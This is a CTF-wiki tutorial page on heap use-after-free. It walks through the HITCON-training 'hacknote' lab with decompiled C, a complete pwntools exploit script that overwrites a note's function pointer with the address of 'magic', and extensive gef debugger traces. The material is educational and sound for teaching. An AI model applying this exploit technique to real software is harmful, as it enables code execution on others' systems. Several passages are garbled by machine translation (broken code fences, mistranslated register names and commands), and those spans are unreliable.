[EN](./use_after_free.md) | [ZH](./use_after_free-zh.md)
# Use After Free



## Principle


Simply put, Use After Free is what it literally means, and is used again when a block of memory is released. But in fact, here are the following situations


- After the memory block is released, its corresponding pointer is set to NULL, and then used again, the natural program will crash.
- After the memory block is released, its corresponding pointer is not set to NULL, and then there is no code to modify the memory block before it is used next time, then the program is likely to work properly**.
- After the memory block is released, its corresponding pointer is not set to NULL, but before it is used next time, there is code to modify the memory, then when the program uses the memory again, ** is very There may be strange problems**.




The **Use After Free** vulnerability we generally refer to is mainly the latter two. In addition, ** we generally say that the memory pointer that was not set to NULL after being released is the dangling pointer. **


Here is a simple example


```c++

#include <stdio.h>

#include <stdlib.h>

typedef struct name {

  char *myname;

  void (*func)(char *str);

} NAME;

void myprint(char *str) { printf("%s\n", str); }

void printmyname() { printf("call print my name\n"); }

int main() {

  NAME *a;

  a = (NAME *)malloc(sizeof(struct name));

  a->func = myprint;

  a->myname = "I can also use it";

  a->func("this is my function");

  // free without modify

  free(a);

  a->func("I can also use it");

  // free with modify

  a->func = printmyname;

  a->func("this is my function");

  // set NULL

  a = NULL;

  printf("this pogram will crash...\n");

  a->func("can not be printed...");

}

```



The results are as follows


```shell

➜  use_after_free git:(use_after_free) ✗ ./use_after_free                      

this is my function

I can also use it

call print my name

this pogram will crash...

[1]    38738 segmentation fault (core dumped)  ./use_after_free

```



## example


Here we take [lab 10 hacknote] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote) in HITCON-training as an example.


### Functional Analysis


We can simply analyze the program, we can see that there is a menu function at the beginning of the program, which has


```c

  puts(" 1. Add note          ");

  puts(" 2. Delete note       ");

  puts(" 3. Print note        ");

  puts(" 4. Exit              ");

```



Therefore, the program should have three main functions. The program then performs the appropriate function based on the user&#39;s input.


#### add_note



According to the program, we can see that the program can add up to 5 notes. Each note has two fields, put and content, where put is set to a function whose function outputs content specific content.


```c++

unsigned int add_note()

{

  note *v0; // ebx

  signed int i; // [esp+Ch] [ebp-1Ch]

  int size; // [esp+10h] [ebp-18h]

  char buf; // [esp+14h] [ebp-14h]

  unsigned int v5; // [esp+1Ch] [ebp-Ch]



  v5 = __readgsdword(0x14u);

  if ( count <= 5 )

  {

    for ( i = 0; i <= 4; ++i )

    {

      if ( !notelist[i] )

      {

        notelist[i] = malloc(8u);

        if ( !notelist[i] )

        {

          puts("Alloca Error");

          exit(-1);

        }

        notelist[i]->put = print_note_content;

        printf("Note size :");

        read(0, &buf, 8u);

        size = atoi(&buf);

v0 = notelist [i];
        v0->content = malloc(size);

        if ( !notelist[i]->content )

        {

          puts("Alloca Error");

          exit(-1);

        }

        printf("Content :");

        read(0, notelist[i]->content, size);

        puts("Success !");

        ++count;

        return __readgsdword(0x14u) ^ v5;

      }

    }

  }

  else

  {

    puts("Full");

  }

  return __readgsdword(0x14u) ^ v5;

}

```



#### print_note



Print_note simply outputs the contents of the note corresponding to the index based on the index of the given note.

```c

unsigned int print_note()

{

  int v1; // [esp+4h] [ebp-14h]

  char buf; // [esp+8h] [ebp-10h]

  unsigned int v3; // [esp+Ch] [ebp-Ch]



v3 = __readgsdword (0x14u);
  printf("Index :");

  read(0, &buf, 4u);

v1 = atoi (&amp; buf);
  if ( v1 < 0 || v1 >= count )

  {

    puts("Out of bound!");

    _exit(0);

  }

  if ( notelist[v1] )

    notelist[v1]->put(notelist[v1]);

  return __readgsdword(0x14u) ^ v3;

}

```



#### delete_note



Delete_note will release the corresponding note based on the given index. However, it is worth noting that when deleting, it is simply free, but not set to NULL, then obviously, there is the case of Use After Free.


```c

unsigned int del_note()

{

  int v1; // [esp+4h] [ebp-14h]

  char buf; // [esp+8h] [ebp-10h]

  unsigned int v3; // [esp+Ch] [ebp-Ch]



v3 = __readgsdword (0x14u);
  printf("Index :");

  read(0, &buf, 4u);

v1 = atoi (&amp; buf);
  if ( v1 < 0 || v1 >= count )

  {

    puts("Out of bound!");

    _exit(0);

  }

  if ( notelist[v1] )

  {

    free(notelist[v1]->content);

    free(notelist[v1]);

    puts("Success");

  }

  return __readgsdword(0x14u) ^ v3;

}

```



### Utilization Analysis


We can see that Use After Free may indeed happen, so how can we make it happen and use it? It is also important to note that there is also a magic function in this program. Is it possible to make the program execute the magic function by using after after? ** A very straightforward idea is to modify the put field of the note to the address of the magic function, thus implementing the magic function when executing the print note. ** So how do you do this?


We can simply look at the specific process of each note generation.


1. The program applies 8-byte memory to store the put and content pointers in the note.
2. The program requests a memory of the specified size based on the size entered, and then stores the content.


           +-----------------+                       

           |   put           |                       

           +-----------------+                       

           |   content       |       size              

           +-----------------+------------------->+----------------+

                                                  |     real       |

                                                  |    content     |

                                                  |                |

                                                  +----------------+



So, according to what we learned in the heap implementation, it is clear that the note is a fastbin chunk (16 bytes in size). Our goal is to have the put field of a note as the function address of magic, then we have to find a way to make the put pointer of a note overwritten as a magic address. Since there is only one place in the program to assign a put. So we have to use the time to write real content to cover. The specific ideas adopted are as follows


- Apply note0, real content size is 16 (the size is different from the bin where the note size is located)
- Apply note1, real content size is 16 (the size is different from the bin where the note size is located)
- Release note0
- Release note1
- At this point, the fast bin chunk size of 16 is note1-&gt;note0
- Apply note2 and set the size of real content to 8, then according to the heap allocation rules
- note2 will actually allocate the memory block corresponding to note1.
- real content The corresponding chunk is actually note0.
- If we write the magic address to the chunk part of the note2 real content at this time, then since we don&#39;t have note0 NULL. When we try to output note0 again, the program will call the magic function.


### Using scripts


```python

#!/usr/bin/env python

# -*- coding: utf-8 -*-



from pwn import *



r = process('./hacknote')





def addnote(size, content):

    r.recvuntil(":")

    r.sendline("1")

    r.recvuntil(":")

    r.sendline(str(size))

    r.recvuntil(":")

    r.sendline(content)





def delnote(idx):

    r.recvuntil(":")

    r.sendline("2")

    r.recvuntil(":")

    r.sendline(str(idx))





def printnote(idx):

    r.recvuntil(":")

    r.sendline("3")

    r.recvuntil(":")

    r.sendline(str(idx))





#gdb.attach(r)

magic = 0x08048986



addnote(32, "aaaa") # add note 0

addnote (32, &quot;daa&quot;) # add note 1


delnote(0) # delete note 0

delnote(1) # delete note 1


addnote(8, p32(magic)) # add note 2



printnote(0) # print note 0



r.interactive()

```



We can look at the execution process specifically, first break down the breakpoint


**Two malloc breakpoints**


```shell

gef➤  b *0x0804875C

Breakpoint 1 at 0x804875c

gef➤  b *0x080486CA

Breakpoint 2 at 0x80486ca

```



**Two free breakpoints**


```shell

gef➤  b *0x08048893

Breakpoint 3 at 0x8048893

gef➤  b *0x080488A9

Breakpoint 4 at 0x80488a9

```



Then continue to execute the program, you can see that when you apply for note0, the requested memory block address is 0x0804b008. (eax storage function return value)


`` `asm
$eax   : 0x0804b008  →  0x00000000

$ebx   : 0x00000000

$ ecx: 0xf7fac780 → 0x00000000
$edx   : 0x0804b008  →  0x00000000

$esp   : 0xffffcf10  →  0x00000008

$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000

$ you are: 0xf7fac000 → 0x001b1db0
$ edi: 0xf7fac000 → 0x001b1db0
$ Eip: 0x080486cf → <add_note+89> add esp, 0x10
$cs    : 0x00000023

$ss    : 0x0000002b

$ds    : 0x0000002b

$ is: 0x0000002b
$fs    : 0x00000000

$gs    : 0x00000063

$eflags: [carry PARITY adjust zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────

    0x80486c2 <add_note+76>    add    DWORD PTR [eax], eax

    0x80486c4 <add_note+78>    add    BYTE PTR [ebx+0x86a0cec], al

    0x80486ca <add_note+84>    call   0x80484e0 <malloc@plt>

 →  0x80486cf <add_note+89>    add    esp, 0x10

    0x80486d2 <add_note+92>    mov    edx, eax

    0x80486d4 <add_note+94>    mov    eax, DWORD PTR [ebp-0x1c]

    0x80486d7 <add_note+97>    mov    DWORD PTR [eax*4+0x804a070], edx

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────

['0xffffcf10', 'l8']

8

0xffffcf10│+0x00: 0x00000008	 ← $esp

0xffffcf14│+0x04: 0x00000000

0xffffcf18│+0x08: 0xf7e29ef5  →  <strtol+5> add eax, 0x18210b

0xffffcf1c│+0x0c: 0xf7e27260  →  <atoi+16> add esp, 0x1c

0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000

0xffffcf24│+0x14: 0x00000000

0xffffcf28│+0x18: 0x0000000a

0xffffcf2c│+0x1c: 0x00000000

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────

---Type <return> to continue, or q <return> to quit---

[#0] 0x80486cf → Name: add_note()

[#1] 0x8048ac5 → Name: main()

───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

gef➤  heap chunk 0x0804b008

UsedChunk(addr=0x804b008, size=0x10)

Chunk size: 16 (0x10)

Usable size: 12 (0xc)

Previous chunk size: 0 (0x0)

PREV_INUSE flag: On

IS_MMAPPED flag: Off

NON_MAIN_ARENA flag: Off

```



**The address of the content of the application note 0 is 0x0804b018**


`` `asm
$eax   : 0x0804b018  →  0x00000000

$ebx   : 0x0804b008  →  0x0804865b  →  <print_note_content+0> push ebp

$ ecx: 0xf7fac780 → 0x00000000
$edx   : 0x0804b018  →  0x00000000

$esp   : 0xffffcf10  →  0x00000020

$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000

$ you are: 0xf7fac000 → 0x001b1db0
$ edi: 0xf7fac000 → 0x001b1db0
$ Eip: 0x08048761 → <add_note+235> add esp, 0x10
$cs    : 0x00000023

$ss    : 0x0000002b

$ds    : 0x0000002b

$ is: 0x0000002b
$fs    : 0x00000000

$gs    : 0x00000063

$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────

    0x8048752 <add_note+220>   mov    al, ds:0x458b0804

    0x8048757 <add_note+225>   call   0x581173df

    0x804875c <add_note+230>   call   0x80484e0 <malloc@plt>

 →  0x8048761 <add_note+235>   add    esp, 0x10

    0x8048764 <add_note+238>   mov    DWORD PTR [ebx+0x4], eax

    0x8048767 <add_note+241>   mov    eax, DWORD PTR [ebp-0x1c]

    0x804876a <add_note+244>   mov    eax, DWORD PTR [eax*4+0x804a070]

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────

['0xffffcf10', 'l8']

8

0xffffcf10│+0x00: 0x00000020	 ← $esp

0xffffcf14│+0x04: 0xffffcf34  →  0xf70a3233

0xffffcf18│+0x08: 0x00000008

0xffffcf1c│+0x0c: 0xf7e27260  →  <atoi+16> add esp, 0x1c

0xffffcf20│+0x10: 0xffffcf58  →  0xffff0a31  →  0x00000000

0xffffcf24│+0x14: 0x00000000

0xffffcf28│+0x18: 0x0000000a

0xffffcf2c│+0x1c: 0x00000000

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ trace ]────

---Type <return> to continue, or q <return> to quit---

[#0] 0x8048761 → Name: add_note()

[#1] 0x8048ac5 → Name: main()

───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

gef➤  heap chunk 0x0804b018

UsedChunk(addr=0x804b018, size=0x28)

Chunk size: 40 (0x28)

Usable size: 36 (0x24)
Previous chunk size: 0 (0x0)

PREV_INUSE flag: On

IS_MMAPPED flag: Off

NON_MAIN_ARENA flag: Off

```



Similarly, we can get the address of note1 and the address of its content are 0x0804b040 and 0x0804b050 respectively.


At the same time, we can also see that the content corresponding to note0 and note1 is indeed the corresponding memory block.


`` `asm
given grip
[+] Searching 'aaaa' in memory

[+] In '[heap]'(0x804b000-0x806c000), permission=rw-

  0x804b018 - 0x804b01c  →   "aaaa" 

grap daa
[+] Searching &#39;deaa&#39; in memory
[+] In '[heap]'(0x804b000-0x806c000), permission=rw-

0x804b050 - 0x804b054 → &quot;good&quot;
```



Here is the free process. We can find in turn that the content of note0 is free first.


`` `asm
 →  0x8048893 <del_note+143>   call   0x80484c0 <free@plt>

   ↳   0x80484c0 <free@plt+0>     jmp    DWORD PTR ds:0x804a018

       0x80484c6 <free@plt+6>     push   0x18

0x80484cb <free@plt+11> jmp 0x8048480
       0x80484d0 <__stack_chk_fail@plt+0> jmp    DWORD PTR ds:0x804a01c

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────

['0xffffcf20', 'l8']

8

0xffffcf20│+0x00: 0x0804b018  →  "aaaa"	 ← $esp



```



Then note0 itself


`` `asm
 →  0x80488a9 <del_note+165>   call   0x80484c0 <free@plt>

   ↳   0x80484c0 <free@plt+0>     jmp    DWORD PTR ds:0x804a018

       0x80484c6 <free@plt+6>     push   0x18

0x80484cb <free@plt+11> jmp 0x8048480
       0x80484d0 <__stack_chk_fail@plt+0> jmp    DWORD PTR ds:0x804a01c

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ stack ]────

['0xffffcf20', 'l8']

8

0xffffcf20│+0x00: 0x0804b008  →  0x0804865b  →  <print_note_content+0> push ebp	 ← $esp

```



When the delete is over, let&#39;s take a look at the bins and we can see that it is actually stored in the corresponding fast bin.


```c++

gef➤  heap bins

───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────

Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b008, size=0x10) 

Fastbins[idx=1, size=0xc] 0x00

Fastbins[idx=2, size=0x10] 0x00

Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b018, size=0x28) 

Fastbins[idx=4, size=0x18] 0x00

Fastbins[idx=5, size=0x1c] 0x00

Fastbins[idx=6, size=0x20] 0x00



```



After we have deleted all the note1, watch bins again. It can be seen that the chunk block deleted later is indeed in the header.


`` `asm
gef➤  heap bins

───────────────────────────────────────────────────────────[ Fastbins for arena 0xf7fac780 ]───────────────────────────────────────────────────────────

Fastbins[idx=0, size=0x8]  ←  UsedChunk(addr=0x804b040, size=0x10)  ←  UsedChunk(addr=0x804b008, size=0x10) 

Fastbins[idx=1, size=0xc] 0x00

Fastbins[idx=2, size=0x10] 0x00

Fastbins[idx=3, size=0x14]  ←  UsedChunk(addr=0x804b050, size=0x28)  ←  UsedChunk(addr=0x804b018, size=0x28) 

Fastbins[idx=4, size=0x18] 0x00

Fastbins[idx=5, size=0x1c] 0x00

Fastbins[idx=6, size=0x20] 0x00



```



Then, at this time, we will apply for note2, we can see what memory block is applied to note2, as follows


**The memory block corresponding to note2 is 0x804b040, which is actually the memory address corresponding to note1. **


`` `asm
[+] Heap-Analysis - malloc(8)=0x804b040

[+] Heap-Analysis - malloc(8)=0x804b040

0x080486cf in add_note ()

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────

$eax   : 0x0804b040  →  0x0804b000  →  0x00000000

$ebx   : 0x00000000

$ ecx: 0xf7fac780 → 0x00000000
$edx   : 0x0804b040  →  0x0804b000  →  0x00000000

$esp   : 0xffffcf10  →  0x00000008

$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000

$ you are: 0xf7fac000 → 0x001b1db0
$ edi: 0xf7fac000 → 0x001b1db0
$ Eip: 0x080486cf → <add_note+89> add esp, 0x10
$cs    : 0x00000023

$ss    : 0x0000002b

$ds    : 0x0000002b

$ is: 0x0000002b
$fs    : 0x00000000

$gs    : 0x00000063

$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────

    0x80486c2 <add_note+76>    add    DWORD PTR [eax], eax

    0x80486c4 <add_note+78>    add    BYTE PTR [ebx+0x86a0cec], al

    0x80486ca <add_note+84>    call   0x80484e0 <malloc@plt>

 →  0x80486cf <add_note+89>    add    esp, 0x10



```



**The memory address of the content of the note2 is 0x804b008, which is the address corresponding to note0. That is, when we write the content to the content of note2, the put field of note0 will be overwritten. **


`` `asm
gef➤  n 1

[+] Heap-Analysis - malloc(8)=0x804b008

[+] Heap-Analysis - malloc(8)=0x804b008

0x08048761 in add_note ()

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ registers ]────

$eax   : 0x0804b008  →  0x00000000

$ebx   : 0x0804b040  →  0x0804865b  →  <print_note_content+0> push ebp

$ ecx: 0xf7fac780 → 0x00000000
$edx   : 0x0804b008  →  0x00000000

$esp   : 0xffffcf10  →  0x00000008

$ebp   : 0xffffcf48  →  0xffffcf68  →  0x00000000
$ you are: 0xf7fac000 → 0x001b1db0
$ edi: 0xf7fac000 → 0x001b1db0
$ Eip: 0x08048761 → <add_note+235> add esp, 0x10
$cs    : 0x00000023

$ss    : 0x0000002b

$ds    : 0x0000002b

$ is: 0x0000002b
$fs    : 0x00000000

$gs    : 0x00000063

$eflags: [carry PARITY adjust ZERO sign trap INTERRUPT direction overflow resume virtualx86 identification]

──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ code:i386 ]────

    0x8048752 <add_note+220>   mov    al, ds:0x458b0804

    0x8048757 <add_note+225>   call   0x581173df

    0x804875c <add_note+230>   call   0x80484e0 <malloc@plt>

 →  0x8048761 <add_note+235>   add    esp, 0x10

```



Let&#39;s examine it in detail. Looking at the situation before the overlay, we can see that the put pointer of the memory block has been set to NULL, which is determined by the free mechanism of fastbin.


`` `asm
gef➤  x/2xw 0x804b008

0x804b008:	0x00000000	0x0804b018

```



After coverage, the specific values are as follows


`` `asm
gef➤  x/2xw 0x804b008

0x804b008:	0x08048986	0x0804b00a

gef➤  x/i 0x08048986

   0x8048986 <magic>:	push   ebp

```



It can be seen that it has indeed been covered as the magic function we want.


The final execution is as follows


```shell

[+] Starting local process './hacknote': pid 35030

[*] Switching to interactive mode

flag{use_after_free}----------------------

       HackNote       

----------------------

 1. Add note          

 2. Delete note       

 3. Print note        

 4. Exit              

----------------------

```



At the same time, we can also use gef&#39;s heap-analysis-helper to see the application and release of the whole heap, as follows


`` `asm
gef➤  heap-analysis-helper 

[*] This feature is under development, expect bugs and unstability...

[+] Tracking malloc()

[+] Tracking free()

[+] Tracking realloc()

[+] Disabling hardware watchpoints (this may increase the latency)

[+] Dynamic breakpoints correctly setup, GEF will break execution if a possible vulnerabity is found.

[*] Note: The heap analysis slows down noticeably the execution. 

gef➤  c

Continuing.

[+] Heap-Analysis - malloc(8)=0x804b008

[+] Heap-Analysis - malloc(8)=0x804b008

[+] Heap-Analysis - malloc(32)=0x804b018

[+] Heap-Analysis - malloc(8)=0x804b040

[+] Heap-Analysis - malloc(32)=0x804b050

[+] Heap-Analysis - free(0x804b018)

[+] Heap-Analysis - watching 0x804b018

[+] Heap-Analysis - free(0x804b008)

[+] Heap-Analysis - watching 0x804b008

[+] Heap-Analysis - free(0x804b050)

[+] Heap-Analysis - watching 0x804b050

[+] Heap-Analysis - free(0x804b040)

[+] Heap-Analysis - watching 0x804b040

[+] Heap-Analysis - malloc(8)=0x804b040

[+] Heap-Analysis - malloc(8)=0x804b008

[+] Heap-Analysis - Cleaning up

[+] Heap-Analysis - Re-enabling hardware watchpoints

[New process 36248]

process 36248 is executing new program: /bin/dash

[New process 36249]

process 36249 is executing new program: /bin/cat

[Inferior 3 (process 36249) exited normally]

```



The first output here is twice, it should be a problem with the gef tool.


## topic


- 2016 HCTF mount

